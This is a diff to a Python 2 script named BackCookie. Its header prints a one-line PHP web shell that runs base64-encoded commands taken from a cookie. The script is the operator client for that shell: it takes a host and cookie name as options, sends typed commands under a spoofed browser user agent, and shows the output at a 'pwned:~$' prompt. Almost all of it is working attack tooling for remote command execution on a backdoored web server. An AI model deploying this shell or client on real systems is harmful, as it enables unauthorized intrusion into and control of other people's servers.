@@ -10,6 +10,7 @@ import os                                     #
 import sys                                    #
 from sys import argv                          #
 from urllib2 import build_opener, HTTPHandler #
+import optparse 					           #
 ############################################################################
 #                                                                          #
 # Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> #
@@ -27,14 +28,11 @@ from urllib2 import build_opener, HTTPHandler #
 #BackCookie
 #
 if "linux" in sys.platform:
-    os.system("clear")
+	os.system("clear")
 elif "win" in sys.platform:
-    os.system("cls")
+	os.system("cls")
 else:
     pass
-
-# Name of the cookie
-cookie = "1"
 
 # colors
 class color:
@@ -50,48 +48,66 @@ class core:
     ck = 'Cookie'
     vc = '={0}'
     eb = 'base64'
+        
+def Error():
+	print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
+	print "\t\t+    Developed by: @mrjopino      +"
+	print "\t\t+             Sorry :(            +"
+	print "\t\t-----------------------------------\n\n"
+	print color.verde + "[-] " + color.rojo  + "Connection error ! \n" + color.rojo
+	exit(0)
 
-def backcookie(c, a, debugLevel=0): # c is command & a is agent
-    o = build_opener(HTTPHandler(debuglevel=debugLevel))
-    o.addheaders = [
-        (core.ua, a),
-        (core.ck, cookie + core.vc.format(c.encode(core.eb)))
-    ]
-    l = o.open(argv[1])
-    print color.azul + l.read().strip() + color.blanco
+
+def backcookie(command,host,cookie,validateCommand,debugLevel=0):
+	o = build_opener(HTTPHandler(debuglevel=debugLevel))
+	o.addheaders = [
+		(core.ua, "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1;"),
+		(core.ck, cookie + core.vc.format(command.encode(core.eb)))
+	]
+	try:
+		l = o.open(host)
+		Validate = l.headers.values()
+	except:
+		Error()
+	if Validate[0] == '0' or validateCommand == "command":
+		print color.azul + l.read().strip() + color.blanco
+	else:
+		Error()
+
+def shell(host,cookie):
+	backcookie("cd",host,cookie,"")
+	print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
+	print "\t\t+    Developed by: @mrjopino      +"
+	print "\t\t+             To play             +"
+	print "\t\t-----------------------------------\n\n"
+	print color.verde + "[+] " + color.azul  + "Happy hacking" + color.blanco
+	print color.verde + "[+] " + color.azul  + "Sometimes it is not positive, but sometimes if!\n" + color.blanco
+
+	while True:
+		command = raw_input("pwned:~$ ")
+		if command != "exit": #exit console backcookie
+			backcookie(command,host,cookie,"command")
+		else:
+			print "\t\t-------------\033[94mDeveloper\033[0m------------"
+			print "\t\t+        José Pino (Fraph)       +"
+			print "\t\t+       Security researcher      +"
+			print "\t\t+            @mrjopino           +"
+			print "\t\t----------------------------------\n\n"
+			print color.azul + "[-] " + color.rojo + core.bc + " OFF\n" + color.blanco
+			break
 
 def main():
-    print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
-    print "\t\t+    Developed by: @mrjopino      +"
-    print "\t\t+             To play             +"
-    print "\t\t-----------------------------------\n\n"
-    print color.verde + "[+] " + color.azul  + "Happy hacking" + color.blanco
-    print color.verde + "[+] " + color.azul  + "Sometimes it is not positive, but sometimes if!\n" + color.blanco
-
-    a = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; "
-    a = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; "
-    a = "WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; "
-    a = ".NET CLR 3.0.30729; .NET CLR 3.5.30729; "
-    a = "Media Center PC 6.0; .NET4.0C; .NET4.0E; "
-    a = "Mozilla/5.0 (Windows; U; Windows NT 5.1; "
-    a = "Mozilla/5.0 (Windows; U; Windows NT 6.0; "
-    a = "Mozilla/5.0 (X11; U; Linux i686; "
-    a = "Mozilla/5.0 (Android; Mobile; "
-    a = "Mozilla/5.0 (Android; Tablet; "
-
-    while True:
-        
-        c = raw_input("pwned:~$ ")
-        if c != "exit": #exit console backcookie
-            backcookie(c, a)
-        else:
-            print "\t\t-------------\033[94mDeveloper\033[0m------------"
-            print "\t\t+        José Pino (Fraph)       +"
-            print "\t\t+       Security researcher      +"
-            print "\t\t+            @mrjopino           +"
-            print "\t\t----------------------------------\n\n"
-            print color.azul + "[-] " + color.rojo + core.bc + " OFF\n" + color.blanco
-            break
+	parser = optparse.OptionParser("%prog -u <<Host>> -c <<Cookie>>", version="1.1")
+	parser.add_option("-u",dest="Host",type="string",help="specify hostname to run on")
+	parser.add_option("-c",dest="Cookie",type="string",help="specify Cookie")
+	(options, args) = parser.parse_args()
+	host = options.Host
+	cookie = options.Cookie
+	if host and cookie:
+		shell(host,cookie)
+	else:
+		parser.print_help()
+		exit(0)
 
 if __name__ == "__main__":
     main()
